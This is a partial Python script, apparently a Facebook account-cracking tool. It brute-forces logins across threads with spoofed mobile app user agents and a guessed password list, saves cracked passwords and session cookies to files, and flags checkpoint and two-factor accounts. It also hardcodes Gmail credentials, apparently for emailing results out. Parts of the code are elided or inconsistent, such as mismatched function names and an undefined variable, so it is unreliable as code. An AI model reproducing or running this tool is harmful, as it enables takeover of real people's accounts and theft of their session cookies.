...
import ssl,smtplib
email_sender = 'xianlee972@gmail.com'
email_password = 'Igopsxianleeuwu'
email_receiver = 'paragosoxianlee8@gmail.com'
...
try:
	open('.prox.txt','w').write(requests.get('https://github.com/Jaketool').text)
...
\033[1;35m╚════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
 ...
 \033[1;32mv1.2\033[1;31m•░
\033[1;97m--------------------------------------------------
\033[1;91m Author      : jakewuu
\033[1;91m Version     : 2.0
\033[1;91m Tool Type   : Paid/private
\033[1;97m--------------------------------------------------"""
		...
		with tred(max_workers=30) as Hamza:	
			...
			for psx in user:
				...
				if pcs in ['2','02']:
					...
					passlist = [psx,ids,'57575751','57273200','i love you','iloveyou','59039200','708090']
				if mthd in ['1','01']:
					jake.submit(jake1,ids,passlist)
				if mthd in ['2','02']:
					jake.submit(jake2,ids,passlist)
				if mthd in ['3','03']:
					jake.submit(jake3,ids,passlist)
				if mthd in ['4','04']:
					jake.submit(jake4,ids,passlist)
		print('\033[1;37m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def api1(ids,names,passlist):
        try:
                ...
                for pw in passlist:
                        ...
                        ua  = "[FBAN/FB4A;FBAV/266.0.0.64.124;FBBV/209629372;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/0;FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G892U;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]"
...
'Content-Length': '2126'}
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [jake-OK] '+ids+' | '+pas+'\033[1;97m')
                                        ...
                                        open('/sdcard/jake-COKIE.txt','a').write(ids+'|'+pas+' | '+coki+'\n')
                                        open('/sdcard/jake-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m\r\r [jake-CP] '+ids+' | '+pas+'\033[1;97m')
...
def api2(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [jake-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
'Content-Length': '706'}
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [jake-OK] '+ids+' | '+pas+'\033[1;97m')
                                        q = po
                                        powerjake = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);HAMZAramxan = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={HAMZAramxan};{powerHAMZA}"
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/jake-COKIE.txt','a').write(ids+'|'+pas+' | '+cookie+'\n')
                                        open('/sdcard/jake-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[jake-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
...
def api3(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [jake-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
'Content-Length': '847'}
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[Jasr-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
...
def api4(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m [jake-M4] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		...
		for pw in passlist:
			...
			if "checkpoint" in str(ses.cookies.get_dict()):
				print('\r\r\033[1;91m [jake-CP] '+ids+' | '+pas)
				open('/sdcard/jake-CP.txt','a').write(ids+'|'+pas+'\n')
				cps.append(ids)
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items()])
				print('\r\r\033[1;92m [jake-OK] '+ids+' | '+pas+'\033[1;37m')
				open('/sdcard/jake-COKIE.txt','a').write(ids+'|'+pas+' | '+coki+'\n')
				open('/sdcard/jake-OK.txt','a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
